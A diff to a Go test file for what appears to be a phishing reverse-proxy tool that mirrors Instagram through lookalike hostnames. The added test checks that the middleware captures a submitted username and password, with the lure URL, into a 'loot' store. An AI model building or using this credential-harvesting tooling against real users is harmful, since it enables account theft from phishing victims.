@@ -1,6 +1,7 @@
 package main
 
 import (
+	"bytes"
 	"io"
 	"net/http"
 	"net/http/httptest"
@@ -8,6 +9,7 @@ import (
 	"sort"
 	"strings"
 	"testing"
+	"time"
 
 	"github.com/gofiber/fiber/v2"
 	"github.com/gofiber/fiber/v2/middleware/session"
@@ -16,9 +18,13 @@ import (
 	"github.com/valyala/fasthttp"
 )
 
+func nextHandler(c *fiber.Ctx) error {
+	return c.Next()
+}
+
 func TestAPIMiddlewareNextForwarding(t *testing.T) {
 	app := fiber.New()
-	app.Use(NewAPIMiddleware(APIConfig{APIHostname: "api.example.com"}))
+	app.Use(NewAPIMiddleware(APIConfig{APIHostname: "api.example.com", AuthHandler: nextHandler}))
 	app.All("/*", func(c *fiber.Ctx) error {
 		return c.SendString("Hello")
 	})
@@ -66,7 +72,7 @@ func TestAPIMiddlewareGetCookies(t *testing.T) {
 		t.Run(tt.name, func(t *testing.T) {
 
 			cm := NewCookieManager()
-			app := createAPIApp(t, cm)
+			app := createAPIApp(t, cm, nil)
 
 			req := httptest.NewRequest("GET", "https://api.example.com/cookies", nil)
 			cookie := getValidCookie(t, app)
@@ -125,7 +131,7 @@ func TestAPIMiddlewareCreateCookies(t *testing.T) {
 		t.Run(tt.name, func(t *testing.T) {
 
 			cm := NewCookieManager()
-			app := createAPIApp(t, cm)
+			app := createAPIApp(t, cm, nil)
 
 			body := strings.NewReader(tt.newCookie.String())
 			req := httptest.NewRequest("POST", "https://api.example.com/cookies", body)
@@ -173,7 +179,33 @@ func TestAPIMiddlewareGetOrigin(t *testing.T) {
 	require.Equal(t, "https://www.instagram.com", destURL.String())
 }
 
-func createAPIApp(t *testing.T, cm CookieManager) *fiber.App {
+func TestAPIMiddlewareSaveCreds(t *testing.T) {
+	cm := NewCookieManager()
+	var buff bytes.Buffer
+	lootRepo := NewFileLootRepository(&buff)
+	lootService := NewLootService(lootRepo)
+	app := createAPIApp(t, cm, lootService)
+	start := time.Now()
+
+	body := strings.NewReader(`{"username":"user","password":"pass"}`)
+	req := httptest.NewRequest("POST", "https://api.example.com/login", body)
+	cookie := getValidCookie(t, app)
+	req.AddCookie(cookie)
+	req.Header["Content-Type"] = []string{"application/json"}
+
+	resp, err := app.Test(req)
+	require.NoError(t, err)
+	require.Equal(t, http.StatusOK, resp.StatusCode)
+	result := scanDBLoginInfos(t, &buff)
+	require.Len(t, result, 1)
+	info := result[0]
+	assert.Equal(t, "user", info.Username)
+	assert.Equal(t, "pass", info.Password)
+	assert.Equal(t, "/abc/def", info.LureURL)
+	assert.Greater(t, info.Date.UnixNano(), start.UnixNano())
+}
+
+func createAPIApp(t *testing.T, cm CookieManager, lootService LootService) *fiber.App {
 	t.Helper()
 	app := fiber.New()
 	auth := NewAuthMiddleware(AuthConfig{
@@ -192,6 +224,8 @@ func createAPIApp(t *testing.T, cm CookieManager) *fiber.App {
 	api := NewAPIMiddleware(APIConfig{
 		APIHostname:     "api.example.com",
 		DomainConverter: NewDomainConverter("example.com"),
+		AuthHandler:     auth,
+		LootService:     lootService,
 	})
 	app.Use(auth, api)
 	app.All("/*", func(c *fiber.Ctx) error {
